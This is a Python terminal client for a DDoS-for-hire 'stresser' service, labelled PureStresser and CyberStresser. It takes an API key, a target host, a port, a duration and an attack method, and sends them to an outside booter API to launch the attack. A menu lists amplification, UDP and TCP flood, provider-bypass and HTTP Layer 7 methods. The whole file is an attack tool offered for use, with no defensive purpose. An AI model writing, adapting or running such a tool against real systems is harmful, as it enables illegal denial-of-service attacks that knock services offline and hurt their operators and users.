from colorama import Fore,init
init(convert=True)
import requests,os
import pyfiglet,time
os.system('title PureStresser - Support : Terminal#1337')
def cls():
    linux = "clear"
    windows = "cls"
    os.system([linux,windows][os.name=="nt"])

cls()
def bannerz():
    banner = pyfiglet.figlet_format("PURESTRESSER")
    print(Fore.LIGHTMAGENTA_EX+(banner)+Fore.RESET)
    print(Fore.RED+"       Welcome to PureStresser Panel!! | Total Servers: 37"+Fore.RESET)
def userin():
    print(Fore.LIGHTMAGENTA_EX+(banner)+Fore.RESET)
    print(Fore.RED+"       Welcome to CyberStresser Panel!! | Total Servers: 37"+Fore.RESET)
    print(Fore.LIGHTCYAN_EX+"                 [1] Check Available Attack Methods"+Fore.RESET)
    print(Fore.LIGHTCYAN_EX+"                 [2] Launch An Attack"+Fore.RESET)
    action = input(Fore.MAGENTA+"I want to [>] "+Fore.RESET)
    if action == '1':
        methods()
        inp = input(Fore.LIGHTBLUE_EX+"\n Press Any Key to Continue"+Fore.RESET)
        bannerz()
        userin()
    elif action == '2':
        pass
        cls()
        ip = input(Fore.LIGHTCYAN_EX+"Enter The Hostname/IP [>]  "+Fore.RESET)
        port = input(Fore.LIGHTCYAN_EX+"Enter The Port  [>]  "+Fore.RESET)
        time_val= input(Fore.LIGHTCYAN_EX+"Enter The Timeout in Seconds [>]  "+Fore.RESET)
        attack_methd = input(Fore.LIGHTCYAN_EX+"Enter The Attack Method [>]  "+Fore.RESET)
        print(Fore.RED+"\n Starting The Attack........."+Fore.RESET)
        r = requests.get(f"https://cyberstress.us/hub/api/api.php?key="+str(api_key) +"&host="+str(ip)+"&port="+port+"&time="+str(time_val)+"&method="+str(attack_methd))
        r = r.text
        lax = '<body background="white">'
        if lax in r:
            saysplit = r.split(lax,1)
            print(Fore.GREEN+saysplit[1]+Fore.RESET)
        time.sleep(2)
        userin()

banner = pyfiglet.figlet_format("CYBERSTRESSER")
print(Fore.LIGHTMAGENTA_EX+(banner)+Fore.RESET)
print(Fore.RED+"       Welcome to CyberStresser Panel!! | Total Servers: 37"+Fore.RESET)

api_key = input(Fore.LIGHTBLUE_EX+"Enter Your API Key [>] "+Fore.RESET)
input_1 = input(Fore.LIGHTBLUE_EX+"Do you want to login[Y/n] "+Fore.RESET)
print(Fore.GREEN+"Successfully Logged In!!"+Fore.RESET)
time.sleep(1)
cls()
print(Fore.LIGHTMAGENTA_EX+(banner)+Fore.RESET)
print(Fore.RED+"       Welcome to CyberStresser Panel!! | Total Servers: 37"+Fore.RESET)
print(Fore.LIGHTCYAN_EX+"                 [1] Check Available Attack Methods"+Fore.RESET)
print(Fore.LIGHTCYAN_EX+"                 [2] Launch An Attack"+Fore.RESET)
action = input(Fore.MAGENTA+"I want to [>] "+Fore.RESET)

def methods():
    cls()
    bannerz()
    print("\n")
    print(Fore.MAGENTA+"AMPLIFICATION :        [1] DNS        [2] DVR     [3]WSD       [4]ARD "+Fore.RESET)
    print(Fore.MAGENTA+"User Datagram :        [1] UDP-GAME   [2]UDP-OVH  [3]BYPASS    [4]ARD "+Fore.RESET)
    print(Fore.MAGENTA+"Transmission Control : [1] TCP-KILLER [2] SYN     [3]KILLALLV2 [4]SYNACK "+Fore.RESET)
    print(Fore.MAGENTA+"Special :              [1] SOURCEOVH  [2] STEAM"+Fore.RESET)
    print(Fore.MAGENTA+"Layer 7 Methods :      [1] HTTP-SOCKET[2] HTTP-SERVER"+Fore.RESET)

if action == '1':
    methods()
    inp = input(Fore.LIGHTBLUE_EX+"\n Press Any Key to Continue..."+Fore.RESET)
    cls()
    # bannerz()
    userin()
elif action == '2':
    pass
    ip = input(Fore.LIGHTCYAN_EX+"Enter The Hostname/IP [>]  "+Fore.RESET)
    port = input(Fore.LIGHTCYAN_EX+"Enter The Port  [>]  "+Fore.RESET)
    time_val= input(Fore.LIGHTCYAN_EX+"Enter The Timeout in Seconds [>]  "+Fore.RESET)
    attack_methd = input(Fore.LIGHTCYAN_EX+"Enter The Attack Method [>]  "+Fore.RESET)
    print(Fore.RED+"\n Starting The Attack........."+Fore.RESET)
    r = requests.get(f"https://cyberstress.us/hub/api/api.php?key="+str(api_key) +"&host="+str(ip)+"&port="+port+"&time="+str(time_val)+"&method="+str(attack_methd))
    r = r.text
    lax = '<body background="white">'
    if lax in r:

        saysplit = r.split(lax,1)
        print(Fore.GREEN+saysplit[1]+Fore.RESET) 
    time.sleep(2)
    userin()

